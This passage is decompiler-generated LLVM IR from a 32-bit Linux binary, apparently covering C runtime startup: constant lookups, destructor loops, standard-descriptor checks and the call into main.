dec_label_pc_80538cd:                             ; preds = %dec_label_pc_8053881, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537d8
  br label %dec_label_pc_80538fa

dec_label_pc_80538d2:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538d9:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538e0:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538e7:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538ee:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538f5:                             ; preds = %dec_label_pc_80537b9, %dec_label_pc_80537b9, %dec_label_pc_80537b9
  br label %dec_label_pc_80538fa

dec_label_pc_80538fa:                             ; preds = %dec_label_pc_80538ee, %dec_label_pc_80538e7, %dec_label_pc_80538e0, %dec_label_pc_80538d9, %dec_label_pc_80538d2, %dec_label_pc_80538c6, %dec_label_pc_80538bf, %dec_label_pc_80538b8, %dec_label_pc_80538b1, %dec_label_pc_80538aa, %dec_label_pc_805389c, %dec_label_pc_8053895, %dec_label_pc_80538a3, %dec_label_pc_805387a, %dec_label_pc_8053870, %dec_label_pc_8053866, %dec_label_pc_805385c, %dec_label_pc_8053852, %dec_label_pc_8053848, %dec_label_pc_805383e, %dec_label_pc_8053834, %dec_label_pc_805382a, %dec_label_pc_8053820, %dec_label_pc_805380e, %dec_label_pc_80537fc, %dec_label_pc_80537f2, %dec_label_pc_80537e8, %dec_label_pc_80537ce, %dec_label_pc_80538cd, %dec_label_pc_80538f5
  %v0_80538fd = phi i32 [ 255, %dec_label_pc_80538ee ], [ 2048, %dec_label_pc_80538e7 ], [ 99, %dec_label_pc_80538e0 ], [ 20, %dec_label_pc_80538d9 ], [ -128, %dec_label_pc_80538d2 ], [ 1024, %dec_label_pc_80538c6 ], [ 4, %dec_label_pc_80538bf ], [ 32, %dec_label_pc_80538b8 ], [ 256, %dec_label_pc_80538b1 ], [ 2147483647, %dec_label_pc_80538aa ], [ 16, %dec_label_pc_805389c ], [ 127, %dec_label_pc_8053895 ], [ 200112, %dec_label_pc_80538a3 ], [ 9, %dec_label_pc_805387a ], [ 65535, %dec_label_pc_8053870 ], [ -32768, %dec_label_pc_8053866 ], [ -2147483648, %dec_label_pc_805385c ], [ 8, %dec_label_pc_8053852 ], [ 500, %dec_label_pc_8053848 ], [ 4096, %dec_label_pc_805383e ], [ 16384, %dec_label_pc_8053834 ], [ 1000, %dec_label_pc_805382a ], [ 32768, %dec_label_pc_8053820 ], [ 6, %dec_label_pc_805380e ], [ 65536, %dec_label_pc_80537fc ], [ 100, %dec_label_pc_80537f2 ], [ 131072, %dec_label_pc_80537e8 ], [ 1, %dec_label_pc_80537ce ], [ -1, %dec_label_pc_80538cd ], [ 32767, %dec_label_pc_80538f5 ]
  ret i32 %v0_80538fd

; uselistorder directives
  uselistorder i32 65536, { 33, 34, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 15, 13, 16, 18, 17, 19, 1, 20, 0, 2, 23, 21, 24, 22, 27, 25, 26, 28, 29, 30, 31, 32 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 20, 21, 16, 17, 23, 24, 18, 19, 14, 15, 1, 2, 3, 4, 12, 13, 22, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 -2147483648, { 0, 2, 1 }
  uselistorder i32 65535, { 2, 0, 1, 3 }
  uselistorder i32 1024, { 2, 0, 3, 1, 4 }
  uselistorder i32 2048, { 4, 1, 0, 2, 3 }
  uselistorder i32 255, { 1, 3, 4, 6, 2, 7, 8, 9, 5, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 131, { 4, 0, 1, 3, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 124, { 4, 5, 3, 0, 1, 6, 2 }
  uselistorder i32 117, { 2, 0, 1 }
  uselistorder i32 116, { 1, 2, 0 }
  uselistorder i32 112, { 2, 0, 3, 4, 1, 5, 6, 7 }
  uselistorder i32 111, { 4, 0, 2, 1, 3 }
  uselistorder i32 110, { 4, 0, 2, 1, 3 }
  uselistorder i32 108, { 20, 21, 22, 17, 23, 11, 2, 15, 0, 1, 24, 12, 13, 18, 19, 25, 26, 14, 27, 3, 4, 5, 28, 29, 6, 30, 7, 8, 9, 10, 16, 31 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 104, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 96, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 92, { 11, 12, 1, 0, 4, 2, 3, 6, 13, 14, 9, 10, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 8, 26, 27, 28, 5, 29, 30, 7, 35, 32, 33, 34, 31, 36 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 87, { 2, 0, 1 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 83, { 3, 1, 2, 0 }
  uselistorder i32 80, { 1, 2, 0 }
  uselistorder i32 76, { 3, 4, 1, 5, 0, 6, 2 }
  uselistorder i32 68, { 4, 0, 1, 2, 3 }
  uselistorder i32 60, { 2, 0, 1 }
  uselistorder i32 55, { 2, 0, 1, 3 }
  uselistorder i32 46, { 2, 0, 3, 1 }
  uselistorder i32 43, { 7, 0, 3, 1, 4, 2, 5, 8, 6 }
  uselistorder i32 42, { 2, 0, 3, 1 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i32 39, { 1, 2, 3, 0 }
  uselistorder i32 38, { 1, 2, 3, 0 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 34, { 3, 4, 5, 2, 0, 1, 6, 7, 8 }
  uselistorder i32 33, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 29, { 2, 0, 1 }
  uselistorder i32 27, { 3, 2, 1, 0 }
  uselistorder i32 25, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 23, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 21, { 3, 1, 2, 4, 5, 6, 0 }
  uselistorder i32 17, { 8, 5, 7, 2, 3, 1, 0, 4, 6 }
  uselistorder i32 13, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 9, { 3, 11, 0, 1, 7, 16, 6, 4, 8, 5, 9, 14, 13, 12, 17, 18, 19, 20, 21, 22, 23, 10, 15, 2 }
  uselistorder i32 6, { 0, 14, 4, 5, 1, 28, 6, 2, 7, 16, 15, 17, 18, 19, 20, 21, 22, 23, 11, 8, 12, 13, 24, 25, 26, 27, 9, 3, 10 }
  uselistorder i32 5, { 10, 0, 14, 15, 4, 3, 5, 2, 12, 13, 11, 1, 6, 7, 9, 8 }
  uselistorder label %dec_label_pc_80538fa, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80538cd, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80538a3, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053820, { 1, 0 }
  uselistorder label %dec_label_pc_805380e, { 1, 0 }
}

define i32 @function_80538fe() local_unnamed_addr {
dec_label_pc_80538fe:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80538fe = load i32, i32* @ebx, align 4
  store i32 %v0_80538fe, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32 -134570052), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32 -134570052), i32 2), i32 0), label %dec_label_pc_8053912, label %dec_label_pc_805391f

dec_label_pc_8053912:                             ; preds = %dec_label_pc_80538fe, %dec_label_pc_8053912
  %v1_80539198 = phi i32 [ %v1_8053919, %dec_label_pc_8053912 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32 -134570052), i32 2), i32 -1), %dec_label_pc_80538fe ]
  store i32 ptrtoint (i32* @global_var_8053919.229 to i32), i32* %stack_var_-16, align 4
  %v5_8053912 = mul i32 %v1_80539198, 4
  %v6_8053912 = add i32 %v5_8053912, ptrtoint (i32* @global_var_8056044.228 to i32)
  %v7_8053912 = inttoptr i32 %v6_8053912 to i32*
  %v8_8053912 = load i32, i32* %v7_8053912, align 4
  call void @__pseudo_call(i32 %v8_8053912)
  %v0_8053919.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053919 = add i32 %v0_8053919.pre, -1
  store i32 %v1_8053919, i32* %ebx.global-to-local, align 4
  %v10_805391a = icmp eq i32 %v0_8053919.pre, 0
  %v1_805391d = icmp eq i1 %v10_805391a, false
  br i1 %v1_805391d, label %dec_label_pc_8053912, label %dec_label_pc_805391f

dec_label_pc_805391f:                             ; preds = %dec_label_pc_8053912, %dec_label_pc_80538fe
  %v0_805391f = load i32, i32* @global_var_80561a8.230, align 8
  %v1_8053924 = icmp eq i32 %v0_805391f, 0
  br i1 %v1_8053924, label %dec_label_pc_805392a, label %dec_label_pc_8053928

dec_label_pc_8053928:                             ; preds = %dec_label_pc_805391f
  %v0_8053928 = load i32, i32* %stack_var_-16, align 4
  %v1_8053928 = call i32 @unknown_0(i32 %v0_8053928)
  br label %dec_label_pc_805392a

dec_label_pc_805392a:                             ; preds = %dec_label_pc_8053928, %dec_label_pc_805391f
  %v0_805392a = load i32, i32* @global_var_80561ac.231, align 4
  store i32 %v0_805392a, i32* @ecx, align 4
  %v1_8053930 = icmp eq i32 %v0_805392a, 0
  br i1 %v1_8053930, label %dec_label_pc_8053939, label %dec_label_pc_8053934

dec_label_pc_8053934:                             ; preds = %dec_label_pc_805392a
  %v2_8053934 = load i32, i32* %stack_var_-16, align 4
  %v1_8053937 = call i32 @unknown_0(i32 %v2_8053934)
  br label %dec_label_pc_8053939

dec_label_pc_8053939:                             ; preds = %dec_label_pc_8053934, %dec_label_pc_805392a
  %v2_8053939 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8053939

; uselistorder directives
  uselistorder i32 %v1_8053919, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053912, { 1, 0 }
}

define i32 @function_805393d(i32 %arg1) local_unnamed_addr {
dec_label_pc_805393d:
  ret i32 0
}

define i32 @function_8053940(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053940:
  %v0_8053940 = load i32, i32* @eax, align 4
  ret i32 %v0_8053940
}

define i32 @function_8053941() local_unnamed_addr {
dec_label_pc_8053941:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8053941 = load i32, i32* @esi, align 4
  %v0_8053942 = load i32, i32* @ebx, align 4
  %v0_8053946 = load i32, i32* @eax, align 4
  store i32 %v0_8053946, i32* @esi, align 4
  %v0_8053948 = load i32, i32* @edx, align 4
  store i32 %v0_8053948, i32* @ebx, align 4
  %v4_805394d = call i32 @function_80519bd(i32 %v0_8053946, i32 1, i32 %tmp6)
  %v8_8053955 = icmp eq i32 %v4_805394d, -1
  %v1_8053956 = icmp eq i1 %v8_8053955, false
  br i1 %v1_8053956, label %dec_label_pc_8053971, label %dec_label_pc_8053958

dec_label_pc_8053958:                             ; preds = %dec_label_pc_8053941
  %v0_805395a = load i32, i32* @ebx, align 4
  %v6_8053960 = call i32 @function_8051b92(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054d2c.232, i32 0, i32 0), i32 %v0_805395a)
  %v1_8053968 = load i32, i32* @esi, align 4
  %v12_8053968 = icmp eq i32 %v6_8053960, %v1_8053968
  br i1 %v12_8053968, label %dec_label_pc_8053971, label %dec_label_pc_805396c

dec_label_pc_805396c:                             ; preds = %dec_label_pc_8053958
  %v0_805396c = call i32 @function_8053375()
  br label %dec_label_pc_8053971

dec_label_pc_8053971:                             ; preds = %dec_label_pc_8053958, %dec_label_pc_8053941, %dec_label_pc_805396c
  %v2_8053971 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8053942, i32* @ebx, align 4
  store i32 %v0_8053941, i32* @esi, align 4
  ret i32 %v2_8053971

; uselistorder directives
  uselistorder i32 ()* @function_8053375, { 3, 2, 1, 4, 0 }
  uselistorder i32 (i8*, i32)* @function_8051b92, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @function_80519bd, { 4, 5, 7, 6, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053971, { 2, 0, 1 }
}

define i32 @function_8053975() local_unnamed_addr {
dec_label_pc_8053975:
  %v0_8053978 = load i8, i8* @global_var_80561b0.233, align 16
  %v1_8053978 = icmp eq i8 %v0_8053978, 0
  %v1_805397f = icmp eq i1 %v1_8053978, false
  br i1 %v1_805397f, label %dec_label_pc_8053975.dec_label_pc_80539b1_crit_edge, label %dec_label_pc_8053981

dec_label_pc_8053975.dec_label_pc_80539b1_crit_edge: ; preds = %dec_label_pc_8053975
  %v0_80539b4.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80539b1

dec_label_pc_8053981:                             ; preds = %dec_label_pc_8053975
  store i8 1, i8* @global_var_80561b0.233, align 16
  store i32 4096, i32* @global_var_80561a4.234, align 4
  br label %dec_label_pc_80539b1

dec_label_pc_80539b1:                             ; preds = %dec_label_pc_8053975.dec_label_pc_80539b1_crit_edge, %dec_label_pc_8053981
  %v0_80539b4 = phi i32 [ %v0_80539b4.pre, %dec_label_pc_8053975.dec_label_pc_80539b1_crit_edge ], [ 0, %dec_label_pc_8053981 ]
  ret i32 %v0_80539b4

; uselistorder directives
  uselistorder i8 1, { 11, 1, 12, 4, 5, 6, 2, 3, 8, 0, 13, 14, 15, 16, 7, 10, 9 }
  uselistorder i8* @global_var_80561b0.233, { 1, 0 }
  uselistorder label %dec_label_pc_80539b1, { 1, 0 }
}

define i32 @function_80539b5(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_80539b5:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805619c.235, align 4
  store i32 %arg6, i32* @global_var_80561ac.231, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_80539ec = mul i32 %arg2, 4
  %v3_80539ec = add i32 %tmp44, %v2_80539ec
  store i32 %v3_80539ec, i32* %edx.global-to-local, align 4
  %v1_80539ef = add i32 %v3_80539ec, 4
  store i32 %v1_80539ef, i32* @global_var_80561a0.236, align 32
  %v3_80539f7 = load i32, i32* %arg3, align 4
  %v14_80539f7 = icmp eq i32 %v1_80539ef, %v3_80539f7
  %v1_80539f9 = icmp eq i1 %v14_80539f7, false
  br i1 %v1_80539f9, label %dec_label_pc_8053a01, label %dec_label_pc_80539fb

dec_label_pc_80539fb:                             ; preds = %dec_label_pc_80539b5
  store i32 %v3_80539ec, i32* @global_var_80561a0.236, align 32
  br label %dec_label_pc_8053a01

dec_label_pc_8053a01:                             ; preds = %dec_label_pc_80539b5, %dec_label_pc_80539fb
  %v0_8053a01 = load i32, i32* @ecx, align 4
  store i32 %v0_8053a01, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8053a06 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8053a0b = bitcast i32* %stack_var_-136 to i8*
  %v4_8053a0b = call i32 @function_805200a(i8* %v3_8053a0b, i32 0, i32 120)
  %v0_8053a10 = load i32, i32* @global_var_80561a0.236, align 32
  br label %dec_label_pc_8053a18

dec_label_pc_8053a18:                             ; preds = %dec_label_pc_8053a18, %dec_label_pc_8053a01
  %v0_8053a18 = phi i32 [ %v1_8053a1b, %dec_label_pc_8053a18 ], [ %v0_8053a10, %dec_label_pc_8053a01 ]
  %v1_8053a18 = inttoptr i32 %v0_8053a18 to i32*
  %v2_8053a18 = load i32, i32* %v1_8053a18, align 4
  %v3_8053a18 = icmp eq i32 %v2_8053a18, 0
  %v1_8053a1b = add i32 %v0_8053a18, 4
  %v1_8053a1e = icmp eq i1 %v3_8053a18, false
  br i1 %v1_8053a1e, label %dec_label_pc_8053a18, label %dec_label_pc_8053a3f.preheader

dec_label_pc_8053a3f.preheader:                   ; preds = %dec_label_pc_8053a18
  store i32 %v1_8053a1b, i32* @ebx, align 4
  %v1_8053a3f22 = inttoptr i32 %v1_8053a1b to i32*
  %v2_8053a3f23 = load i32, i32* %v1_8053a3f22, align 4
  %v3_8053a3f24 = icmp eq i32 %v2_8053a3f23, 0
  %v1_8053a4226 = icmp eq i1 %v3_8053a3f24, false
  br i1 %v1_8053a4226, label %dec_label_pc_8053a24.lr.ph, label %dec_label_pc_8053a44

dec_label_pc_8053a24.lr.ph:                       ; preds = %dec_label_pc_8053a3f.preheader
  %v3_8053a04 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8053a2f = add i32 %v3_8053a04, 32
  br label %dec_label_pc_8053a24

dec_label_pc_8053a24:                             ; preds = %dec_label_pc_8053a24.lr.ph, %dec_label_pc_8053a3c
  %v1_8053a2f = phi i32 [ %v2_8053a3f23, %dec_label_pc_8053a24.lr.ph ], [ %v2_8053a3f, %dec_label_pc_8053a3c ]
  %v0_8053a2e = phi i32 [ %v1_8053a1b, %dec_label_pc_8053a24.lr.ph ], [ %v1_8053a3c, %dec_label_pc_8053a3c ]
  %v6_8053a29 = icmp ugt i32 %v1_8053a2f, 14
  br i1 %v6_8053a29, label %dec_label_pc_8053a3c, label %dec_label_pc_8053a2b

dec_label_pc_8053a2b:                             ; preds = %dec_label_pc_8053a24
  %v0_8053a2b = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8053a2b, i32* %stack_var_-160, align 4
  store i32 %v0_8053a2e, i32* %stack_var_-168, align 4
  %v2_8053a2f = mul i32 %v1_8053a2f, 8
  %v4_8053a2f = add i32 %v3_8053a2f, %v2_8053a2f
  %v3_8053a34 = inttoptr i32 %v4_8053a2f to i16*
  %v4_8053a34 = call i32 @function_8054202(i16* %v3_8053a34, i32 %v0_8053a2e, i32 8)
  %v0_8053a3c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053a3c

dec_label_pc_8053a3c:                             ; preds = %dec_label_pc_8053a24, %dec_label_pc_8053a2b
  %v0_8053a3c = phi i32 [ %v0_8053a2e, %dec_label_pc_8053a24 ], [ %v0_8053a3c.pre, %dec_label_pc_8053a2b ]
  %v1_8053a3c = add i32 %v0_8053a3c, 8
  store i32 %v1_8053a3c, i32* @ebx, align 4
  %v1_8053a3f = inttoptr i32 %v1_8053a3c to i32*
  %v2_8053a3f = load i32, i32* %v1_8053a3f, align 4
  %v3_8053a3f = icmp eq i32 %v2_8053a3f, 0
  %v1_8053a42 = icmp eq i1 %v3_8053a3f, false
  br i1 %v1_8053a42, label %dec_label_pc_8053a24, label %dec_label_pc_8053a44

dec_label_pc_8053a44:                             ; preds = %dec_label_pc_8053a3c, %dec_label_pc_8053a3f.preheader
  store i32 %v2_8053a06, i32* @eax, align 4
  %v0_8053a48 = call i32 @function_80542bd()
  store i32 %v0_8053a48, i32* @eax, align 4
  %v0_8053a4d = call i32 @function_8053975()
  %v1_8053a56 = icmp eq i32 %tmp39, 0
  %v1_8053a58 = icmp eq i1 %v1_8053a56, false
  br i1 %v1_8053a58, label %dec_label_pc_8053a5e, label %dec_label_pc_8053a5a

dec_label_pc_8053a5a:                             ; preds = %dec_label_pc_8053a44
  %v1_8053a5a = and i32 %tmp39, -65536
  %v2_8053a5a = or i32 %v1_8053a5a, 4096
  br label %dec_label_pc_8053a5e

dec_label_pc_8053a5e:                             ; preds = %dec_label_pc_8053a44, %dec_label_pc_8053a5a
  %v0_8053a5e = phi i32 [ %tmp39, %dec_label_pc_8053a44 ], [ %v2_8053a5a, %dec_label_pc_8053a5a ]
  store i32 %v0_8053a5e, i32* @global_var_80561a4.234, align 4
  %v13_8053a63 = icmp eq i32 %tmp38, -1
  %v1_8053a68 = icmp eq i1 %v13_8053a63, false
  br i1 %v1_8053a68, label %dec_label_pc_8053a93, label %dec_label_pc_8053a6a

dec_label_pc_8053a6a:                             ; preds = %dec_label_pc_8053a5e
  %v0_8053a6a = call i32 @function_8053fe1()
  store i32 %v0_8053a6a, i32* @ebx, align 4
  %v0_8053a71 = call i32 @function_8053f50()
  %v0_8053a76 = load i32, i32* @ebx, align 4
  %v12_8053a76 = icmp eq i32 %v0_8053a76, %v0_8053a71
  %v1_8053a78 = icmp eq i1 %v12_8053a76, false
  br i1 %v1_8053a78, label %dec_label_pc_8053aa9, label %dec_label_pc_8053a7a

dec_label_pc_8053a7a:                             ; preds = %dec_label_pc_8053a6a
  %v0_8053a7a = call i32 @function_8053f76()
  store i32 %v0_8053a7a, i32* @ebx, align 4
  %v0_8053a81 = call i32 @function_8053f2a()
  %v0_8053a86 = load i32, i32* @ebx, align 4
  %v12_8053a86 = icmp eq i32 %v0_8053a86, %v0_8053a81
  %v1_8053a88 = icmp eq i1 %v12_8053a86, false
  br i1 %v1_8053a88, label %dec_label_pc_8053aa9, label %dec_label_pc_8053a8a.thread

dec_label_pc_8053a8a.thread:                      ; preds = %dec_label_pc_8053a7a
  br label %dec_label_pc_8053ad3

dec_label_pc_8053a93:                             ; preds = %dec_label_pc_8053a5e
  %v15_8053a93 = icmp eq i32 %tmp38, %tmp37
  %v1_8053a97 = icmp eq i1 %v15_8053a93, false
  br i1 %v1_8053a97, label %dec_label_pc_8053aa9, label %dec_label_pc_8053a99

dec_label_pc_8053a99:                             ; preds = %dec_label_pc_8053a93
  br label %dec_label_pc_8053aa9

dec_label_pc_8053aa9:                             ; preds = %dec_label_pc_8053a99, %dec_label_pc_8053a93, %dec_label_pc_8053a7a, %dec_label_pc_8053a6a
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8053ab0 = call i32 @function_8053941()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8053abf = call i32 @function_8053941()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8053ace = call i32 @function_8053941()
  br label %dec_label_pc_8053ad3

dec_label_pc_8053ad3:                             ; preds = %dec_label_pc_8053a8a.thread, %dec_label_pc_8053aa9
  store i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32* %esi.global-to-local, align 4
  %v0_8053ad8 = load i32, i32* @edi, align 4
  %v1_8053ad8 = inttoptr i32 %v0_8053ad8 to i32*
  %v2_8053ad8 = load i32, i32* %v1_8053ad8, align 4
  store i32 %v2_8053ad8, i32* bitcast (i32** @global_var_80560c8.238 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32 -134570052), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80561a8.230, align 8
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32 -134570052), i32 2), i32 0), label %dec_label_pc_8053af8, label %dec_label_pc_8053b04

dec_label_pc_8053af8:                             ; preds = %dec_label_pc_8053ad3, %dec_label_pc_8053af8
  %v4_8053af8 = phi i32 [ %v1_8053aff, %dec_label_pc_8053af8 ], [ 0, %dec_label_pc_8053ad3 ]
  store i32 ptrtoint (i32* @global_var_8053aff.239 to i32), i32* %stack_var_-160, align 4
  %v5_8053af8 = mul i32 %v4_8053af8, 4
  %v6_8053af8 = add i32 %v5_8053af8, ptrtoint (i32* @global_var_8056044.228 to i32)
  %v7_8053af8 = inttoptr i32 %v6_8053af8 to i32*
  %v8_8053af8 = load i32, i32* %v7_8053af8, align 4
  call void @__pseudo_call(i32 %v8_8053af8)
  %v0_8053aff = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053aff = add i32 %v0_8053aff, 1
  store i32 %v1_8053aff, i32* %ebx.global-to-local, align 4
  %v1_8053b00 = load i32, i32* %esi.global-to-local, align 4
  %v7_8053b00 = icmp ult i32 %v1_8053aff, %v1_8053b00
  br i1 %v7_8053b00, label %dec_label_pc_8053af8, label %dec_label_pc_8053b04

dec_label_pc_8053b04:                             ; preds = %dec_label_pc_8053af8, %dec_label_pc_8053ad3
  store i32 134560522, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32 -134570052), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32 -134570052), i32 2), i32 0), label %dec_label_pc_8053b1c, label %dec_label_pc_8053b28

dec_label_pc_8053b1c:                             ; preds = %dec_label_pc_8053b04, %dec_label_pc_8053b1c
  %v4_8053b1c = phi i32 [ %v1_8053b23, %dec_label_pc_8053b1c ], [ 0, %dec_label_pc_8053b04 ]
  store i32 ptrtoint (i32* @global_var_8053b23.240 to i32), i32* %stack_var_-160, align 4
  %v5_8053b1c = mul i32 %v4_8053b1c, 4
  %v6_8053b1c = add i32 %v5_8053b1c, ptrtoint (i32* @global_var_8056044.228 to i32)
  %v7_8053b1c = inttoptr i32 %v6_8053b1c to i32*
  %v8_8053b1c = load i32, i32* %v7_8053b1c, align 4
  call void @__pseudo_call(i32 %v8_8053b1c)
  %v0_8053b23 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053b23 = add i32 %v0_8053b23, 1
  store i32 %v1_8053b23, i32* %ebx.global-to-local, align 4
  %v1_8053b24 = load i32, i32* %esi.global-to-local, align 4
  %v7_8053b24 = icmp ult i32 %v1_8053b23, %v1_8053b24
  br i1 %v7_8053b24, label %dec_label_pc_8053b1c, label %dec_label_pc_8053b28

dec_label_pc_8053b28:                             ; preds = %dec_label_pc_8053b1c, %dec_label_pc_8053b04
  %v0_8053b31 = load i32, i32* %stack_var_-160, align 4
  %v1_8053b31 = call i32 @function_8051fb9(i32 %v0_8053b31)
  %v1_8053b36 = inttoptr i32 %v1_8053b31 to i32*
  store i32 0, i32* %v1_8053b36, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v0_8053b57 = load i32, i32* @edi, align 4
  store i32 %v0_8053b57, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8053b66 = load i32, i32* @eax, align 4
  %v1_8053b69 = call i32 @function_80535c9(i32 %v0_8053b66)
  %v0_8053b75 = load i32, i32* @ebx, align 4
  %v1_8053b75 = inttoptr i32 %v0_8053b75 to %sigcontext*
  %v2_8053b75 = call i32 @sigreturn(%sigcontext* %v1_8053b75)
  %v0_8053b7d = load i32, i32* @ebx, align 4
  %v1_8053b7d = inttoptr i32 %v0_8053b7d to %sigcontext*
  %v2_8053b7d = call i32 @sigreturn(%sigcontext* %v1_8053b7d)
  ret i32 %v2_8053b7d

; uselistorder directives
  uselistorder i32 %v1_8053b23, { 1, 2, 0 }
  uselistorder i32 %v1_8053aff, { 1, 2, 0 }
  uselistorder i32 %v2_8053a3f, { 1, 0 }
  uselistorder i32 %v1_8053a3c, { 2, 1, 0 }
  uselistorder i32 %v1_8053a1b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053a18, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
